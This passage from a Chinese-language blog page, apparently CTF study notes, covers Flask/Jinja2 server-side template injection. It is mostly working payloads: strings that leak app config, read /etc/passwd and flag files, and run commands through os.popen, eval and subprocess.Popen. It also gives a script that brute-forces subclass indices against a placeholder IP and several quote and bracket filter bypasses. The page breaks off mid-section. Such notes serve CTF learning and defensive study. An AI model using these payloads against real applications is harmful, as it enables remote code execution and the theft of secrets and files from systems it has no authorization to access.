<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051638995.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051638995.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051638995.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051638995.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051638995.png"
        title="image-20230205163832804" /></p>
<h2 id="敏感信息泄露">敏感信息泄露</h2>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051639174.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051639174.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051639174.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051639174.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051639174.png"
        title="r" /></p>
<p>通过current_app的payload来替换config获取配置信息：</p>
<pre tabindex="0"><code>?name={{config}}
?name={{url_for.__globals__[&#39;current_app&#39;].config}}
?name={{get_flashed_messages.__globals__[&#39;current_app&#39;].config}}
{{request.environ}}	# 服务器环境信息
</code></pre><p>我们有时候可以使用flask的内置函数比如说<code>url_for</code>，<code>get_flashed_messages</code>，甚至是内置的对象<code>request</code>来查询配置信息或者是构造payload</p>
<ul>
<li><code>config</code></li>
</ul>
<p>我们通常会用<code>{{config}}</code>查询配置信息，如果题目有设置类似<code>app.config ['FLAG'] = os.environ.pop('FLAG')</code>，就可以直接访问<code>{{config['FLAG']}}</code>或者<code>{{config.FLAG}}</code>获得flag</p>
<ul>
<li><code>request</code></li>
</ul>
<p>jinja2中存在对象<code>request</code></p>
<pre tabindex="0"><code>Python 3.7.8
&gt;&gt;&gt; from flask import Flask,request,render_template_string
&gt;&gt;&gt; request.__class__.__mro__[1]
&lt;class &#39;object&#39;&gt;
</code></pre><p>查询一些配置信息</p>
<pre tabindex="0"><code>{{request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config}}
</code></pre><p>构造ssti的payload</p>
<pre tabindex="0"><code>{{request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/passwd&#39;).read()}}
{{request.application.__globals__[&#39;__builtins__&#39;].open(&#39;/etc/passwd&#39;).read()}}
</code></pre><ul>
<li><code>url_for</code></li>
</ul>
<p>查询配置信息</p>
<pre tabindex="0"><code>{{url_for.__globals__[&#39;current_app&#39;].config}}
</code></pre><p>构造ssti的payload</p>
<pre tabindex="0"><code>{{url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;)}}
</code></pre><ul>
<li><code>get_flashed_messages</code></li>
</ul>
<p>查询配置信息</p>
<pre tabindex="0"><code>{{get_flashed_messages.__globals__[&#39;current_app&#39;].config}}
</code></pre><p>构造ssti的payload</p>
<pre tabindex="0"><code>{{get_flashed_messages.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;)}}
</code></pre><h2 id="rce沙箱逃逸">RCE(沙箱逃逸)</h2>
<p>原理这里不详细叙述，主要讲一些本人的做题思路，下面只针对jinja2进行注入。</p>
<p>常用函数</p>
<pre tabindex="0"><code>__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合
__init__             初始化类，返回的类型是function
__globals__          用于访问全局变量
__builtins__         用于返回Python中的内置函数，如eval
__dict__             类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
dir()			    列出一个模组/类/对象 下面 所有的属性和函数
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}}
current_app          应用上下文，一个全局变量。

request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read() }}

cycler               {{cycler.__init__.__globals__.os.popen(&#39;id&#39;).read()}}
joiner               {{joiner.__init__.__globals__.os.popen(&#39;id&#39;).read()}}
namespace            {{namespace.__init__.__globals__.os.popen(&#39;id&#39;).read()}}
</code></pre><p>常用过滤器：</p>
<pre tabindex="0"><code>int()：将值转换为int类型；
float()：将值转换为float类型；
lower()：将字符串转换为小写；
upper()：将字符串转换为大写；
title()：把值中的每个单词的首字母都转成大写；
capitalize()：把变量值的首字母转成大写，其余字母转小写；
trim()：截取字符串前面和后面的空白字符；
wordcount()：计算一个长字符串中单词的个数；
reverse()：字符串反转；
replace(value,old,new)： 替换将old替换为new的字符串；
truncate(value,length=255,killwords=False)：截取length长度的字符串；
striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。
safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{&#39;&lt;em&gt;hello&lt;/em&gt;&#39;|safe}}；
list()：将变量列成列表；
string()：将变量转换成字符串；
join()：将一个序列中的参数值拼接成字符串。示例看上面payload；
abs()：返回一个数值的绝对值；
first()：返回一个序列的第一个元素；
last()：返回一个序列的最后一个元素；
format(value,arags,*kwargs)：格式化字符串。比如：{{ &#34;%s&#34; - &#34;%s&#34;|format(&#39;Hello?&#39;,&#34;Foo!&#34;) }}将输出：Helloo? - Foo!
length()：返回一个序列或者字典的长度；
sum()：返回列表内数值的和；
sort()：返回排序后的列表；
default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。
length()：返回字符串的长度，别名是count。
</code></pre><p>{{3*4}}如果回显为12则代表能进行模板注入</p>
<p>获取基本类：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>{}<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>{}<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__
</span></span><span style="display:flex;"><span>request<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">8</span>] <span style="color:#75715e">#针对jinjia2/flask为[9]适用  不行就-1取最后一个</span>
</span></span></code></pre></div><p>获取基本类后，继续向下获取基本类(object)的子类：</p>
<pre tabindex="0"><code>object.__subclasses__()
{}.__class__.__bases__[0].__subclasses__()
</code></pre><p>这时候会出现很多子类</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051725446.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051725446.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051725446.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051725446.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051725446.png"
        title="image-20230205172532303" /></p>
<pre tabindex="0"><code>命令执行大概的思路就是：
找到父类&lt;type &#39;object&#39;&gt; ---&gt; 寻找子类 ---&gt; 找关于命令执行或者文件操作的模块。
</code></pre><p>下面就是寻找可利用链(寻找可以命令执行或者文件操作的模块)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 将查找到的父类列表替换到data中</span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, ... &lt;class &#39;unicodedata.UCD&#39;&gt;]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 在这里添加可以利用的类，下面会介绍这些类的利用方法</span>
</span></span><span style="display:flex;"><span>userful_class <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;linecache&#39;</span>,<span style="color:#e6db74">&#39;file&#39;</span>, <span style="color:#e6db74">&#39;os._wrap_close&#39;</span>, <span style="color:#e6db74">&#39;subprocess.Popen&#39;</span>, <span style="color:#e6db74">&#39;warnings.catch_warnings&#39;</span>, <span style="color:#e6db74">&#39;_frozen_importlib._ModuleLock&#39;</span>, <span style="color:#e6db74">&#39;_frozen_importlib._DummyModuleLock&#39;</span>, <span style="color:#e6db74">&#39;_frozen_importlib._ModuleLockManager&#39;</span>, <span style="color:#e6db74">&#39;_frozen_importlib.ModuleSpec&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pattern <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;&#39;(.*?)&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>class_list <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(pattern, data)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> class_list:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> userful_class:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">in</span> c:
</span></span><span style="display:flex;"><span>            print(str(class_list<span style="color:#f92672">.</span>index(c)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;: &#34;</span> <span style="color:#f92672">+</span> c)
</span></span></code></pre></div><p>运行后得到下面的序号</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051750123.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051750123.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051750123.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051750123.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051750123.png"
        title="image-20230205175050872" /></p>
<pre tabindex="0"><code>{}.__class__.__bases__[0].__subclasses__()[133]
</code></pre><p>**注意：**这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。每个题目环境的子类顺序可能也不一样，所以最好拿上面的脚本跑一下。</p>
<p>补充：python2中有个file类可以直接进行文件读取，序号在40</p>
<pre tabindex="0"><code>{{[].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read()}}
</code></pre><h3 id="常用的payload">常用的payload</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#常用  利用任意字符串或特殊变量</span>
</span></span><span style="display:flex;"><span>{{sss<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;/flag&#34;</span>)<span style="color:#f92672">.</span>read()}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{config<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>][<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> c<span style="color:#f92672">.</span>__name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">%</span>}{{ c<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>]<span style="color:#f92672">.</span>eval(<span style="color:#e6db74">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span>) }}{<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 利用warnings.catch_warnings，配合__builtins__得到eval函数，直接梭哈（常用）</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># __init__ 初始化，创建对象实例，相当于把一些模块包含进来了 __globals__找到该类所包含的全局变量，再找里面有没有__builtins__这个模块(builtins是python的内建模块),再使用内置模块的一些函数</span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">146</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>][<span style="color:#e6db74">&#39;eval&#39;</span>](<span style="color:#e6db74">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span>)}}   
</span></span><span style="display:flex;"><span>{{()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">146</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>][<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()}}
</span></span><span style="display:flex;"><span>                                                                                   
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 利用os._wrap_close类所属空间下可用的popen函数进行RCE的payload</span>
</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()}}
</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;popen&#39;</span>](<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 利用subprocess.Popen类进行RCE的payload</span>
</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">407</span>](<span style="color:#e6db74">&#39;whoami&#39;</span>,shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,stdout<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>communicate()[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>strip()}}
</span></span><span style="display:flex;"><span>                                                                                        
</span></span><span style="display:flex;"><span><span style="color:#75715e">#上面那些importlibs都可以用下面这个paylaod(ps:实验的时候将需要改的超级大也行)</span>
</span></span><span style="display:flex;"><span>{{()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">80</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>][<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()}}
</span></span><span style="display:flex;"><span>{{()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">999999</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>][<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()}}                                                                                        
</span></span><span style="display:flex;"><span>                                                                                      
</span></span><span style="display:flex;"><span>                                                                                        
</span></span><span style="display:flex;"><span>                                                                                        
</span></span><span style="display:flex;"><span>                                                                                        
</span></span><span style="display:flex;"><span> <span style="color:#75715e">#下面的了解一下,上面的够用了                                                                                       </span>
</span></span><span style="display:flex;"><span>                                                                                        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 利用__import__导入os模块进行利用                                                                                </span>
</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">75</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 利用linecache类所属空间下可用的os模块进行RCE的payload，假设linecache为第250个子类</span>
</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">250</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()}}
</span></span><span style="display:flex;"><span>{{[]<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">250</span>]<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>func_globals[<span style="color:#e6db74">&#39;linecache&#39;</span>]<span style="color:#f92672">.</span>__dict__<span style="color:#f92672">.</span>[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami&#39;</span>)<span style="color:#f92672">.</span>read()}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 利用file类（python3将file类删除了，因此只有python2可用）进行文件读</span>
</span></span><span style="display:flex;"><span>{{[]<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">40</span>](<span style="color:#e6db74">&#39;etc/passwd&#39;</span>)<span style="color:#f92672">.</span>read()}}
</span></span><span style="display:flex;"><span>{{[]<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">40</span>](<span style="color:#e6db74">&#39;etc/passwd&#39;</span>)<span style="color:#f92672">.</span>readlines()}}
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 利用file类进行文件写（python2的str类型不直接从属于属于基类，所以要两次 .__bases__）</span>
</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__bases[<span style="color:#ae81ff">0</span>]__<span style="color:#f92672">.</span>__bases__[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">40</span>](<span style="color:#e6db74">&#39;/tmp&#39;</span>)<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;test&#39;</span>)}}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 通用getshell，都是通过__builtins__调用eval进行代码执行</span>
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> c<span style="color:#f92672">.</span>__name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">%</span>}{{ c<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>]<span style="color:#f92672">.</span>eval(<span style="color:#e6db74">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span>) }}{<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 读写文件，通过__builtins__调用open进行文件读写</span>
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> c<span style="color:#f92672">.</span>__name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">%</span>}{{ c<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;__builtins__&#39;</span>]<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;filename&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read() }}{<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
</span></span></code></pre></div><p>通用方法是使用<code>__builtins__</code>代码执行</p>
<pre tabindex="0"><code>首先`__builtins__`是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如`abs`，`max`，就是因为`__builtins__`这类模块在Python启动时为我们导入了，可以使用`dir(__builtins__)`来查看调用方法的列表，然后可以发现`__builtins__`下有`eval`，`__import__`等的函数，因此可以利用此来执行命令。
</code></pre><p>需要注意的一些点，参考：https://www.freebuf.com/articles/network/258136.html</p>
<pre tabindex="0"><code>os.system无回显(回显布尔值)

os.popen有回显

subprocess.call无回显

subprocess.Popen有回显
</code></pre><p>再来一个通用脚本(重在理解原理)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">500</span>):
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[&#34;</span><span style="color:#f92672">+</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;].__init__.__globals__[&#39;__builtins__&#39;]}}&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url, headers<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;eval&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text:   <span style="color:#75715e">#&#39;os.py&#39;   &#39;popen&#39;   &#39;linecache&#39;</span>
</span></span><span style="display:flex;"><span>        print(i)
</span></span></code></pre></div><h3 id="bypass">bypass</h3>
<p>不是很全，解题够用就行</p>
<h4 id="中括号">中括号</h4>
<p><strong>利用 <code>__getitem__()</code> 绕过</strong>(常用)</p>
<p>可以使用 <code>__getitem__()</code> 方法输出序列属性中的某个索引处的元素</p>
<pre tabindex="0"><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__(&#39;__builtins__&#39;).__getitem__(&#39;eval&#39;)(&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}       // 指定字典属性
</code></pre><p><strong>利用 pop() 绕过</strong>(不建议)</p>
<p>用一次就把环境删了</p>
<p>pop()方法可以返回指定序列属性中的某个索引处的元素或指定字典属性中某个键对应的值</p>
<pre tabindex="0"><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(185).__init__.__globals__.pop(&#39;__builtins__&#39;).pop(&#39;eval&#39;)(&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}  
</code></pre><h4 id="引号">引号</h4>
<p><strong>利用request对象绕过</strong>(常用)</p>
<p>request.args   get传参</p>
<pre tabindex="0"><code>{{().__class__.__bases__[0].__subclasses__()[146].__init__.__globals__[request.args.a][request.args.b](request.args.c).popen(request.args.d).read()}}&amp;a=__builtins__&amp;b=__import__&amp;c=os&amp;d=whoami
</code></pre><p>request.cookie   	cookie传参</p>
<pre tabindex="0"><code>{{().__class__.__bases__[0].__subclasses__()[146].__init__.__globals__[request.cookie.a][request.cookie.b](request.cookie.c).popen(request.cookie.d).read()}}

cookie:a=__builtins__;b=__import__;c=os;d=whoami
</code></pre><p>request.values   post传参</p>
